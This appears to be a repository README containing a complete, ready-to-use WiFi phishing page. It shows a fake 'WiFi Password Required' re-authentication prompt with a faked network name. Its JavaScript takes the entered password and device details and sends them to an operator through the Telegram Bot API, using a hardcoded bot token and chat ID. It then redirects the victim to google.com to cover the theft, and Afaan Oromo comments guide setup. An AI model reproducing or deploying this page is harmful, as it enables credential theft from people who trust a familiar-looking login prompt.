# Freewifi
Free wifi
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Security Update</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Arial,sans-serif; }
  body { background:#f0f4f8; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#fff; width:380px; border-radius:14px; box-shadow:0 8px 30px rgba(0,0,0,.15); padding:30px; text-align:center; }
  .wifi-icon { font-size:60px; color:#1a73e8; }
  h2 { color:#202124; margin:12px 0 5px; font-size:20px; }
  .ssid { color:#5f6368; background:#e8f0fe; display:inline-block; padding:4px 14px; border-radius:20px; font-weight:600; margin:8px 0 18px; }
  input { width:100%; padding:13px; border:2px solid #dadce0; border-radius:8px; font-size:15px; margin:8px 0; outline:none; }
  input:focus { border-color:#1a73e8; }
  .btn { width:100%; padding:14px; background:#1a73e8; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:10px; }
  .btn:hover { background:#1765cc; }
  .note { font-size:12px; color:#80868b; margin-top:15px; }
  .loading { display:none; color:#1a73e8; font-size:14px; margin-top:12px; }
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">📶</div>
  <h2>WiFi Password Required</h2>
  <div class="ssid">Network: <b id="net">Free wifi</b></div>
9
  <!-- Password field -->
  <input type="password" id="pass" placeholder="Enter WiFi password..." autocomplete="off">

  <!-- Confirm password -->
  <input type="password" id="pass2" placeholder="Confirm password..." autocomplete="off">

  <button class="btn" onclick="send()">Connect</button>

  <div class="loading" id="load">⏳ Connecting... Please wait</div>
  <div class="note">Your connection was interrupted. Please re-authenticate.</div>
</div>

<script>
// ========== CONFIG ==========
const BOT_TOKEN="8806012391:AAG6pWd-o6cKYuQ58EFoidLZTXLn0G3Nvoc";      // ← @BotFather irraa kenni
const CHAT_ID   = 987130401;                  // ← Telegram kee ID (Efi108)
const FAKE_SSID = "Free wifi";            // ← WiFi maqaa fakkaatu
// =============================

document.getElementById('net').textContent = FAKE_SSID;

async function send() {
  const p1 = document.getElementById('pass').value.trim();
  const p2 = document.getElementById('pass2').value.trim();

  // Password lama wal-simaa ta'uu mirkaneessi
  if (p1.length < 8 || p1 !== p2) {
    alert('Password must match and be at least 8 characters');
    return;
  }

  // Loading agarsiisi
  document.getElementById('load').style.display = 'block';

  // Device info ofumaan fudhati
  const info = {
    ssid: FAKE_SSID,
    password: p1,
    time: new Date().toLocaleString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height
  };

  const msg = `🔓 WIFI CAPTURED\n` +
              `📡 SSID: ${info.ssid}\n` +
              `🔑 Password: ${info.password}\n` +
              `🕒 Time: ${info.time}\n` +
              `📱 Platform: ${info.platform}\n` +
              `🌐 Lang: ${info.lang}\n` +
              `🖥️ Screen: ${info.screen}`;

  // Telegram Bot API → ofumaan erga
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
  }).then(r => r.json()).then(d => {
    // Yoo tokko ta'e, gara error page
    window.location.href = "https://www.google.com";  // ← Booda gara real site deebi
  }).catch(() => {
    document.getElementById('load').textContent = '❌ Failed. Try again.';
  });

  // Kana booda input qulqulleessi (page jijjiiru dura)
  document.getElementById('pass').value = '';
  document.getElementById('pass2').value = '';
}
</script>
</body>
</html>
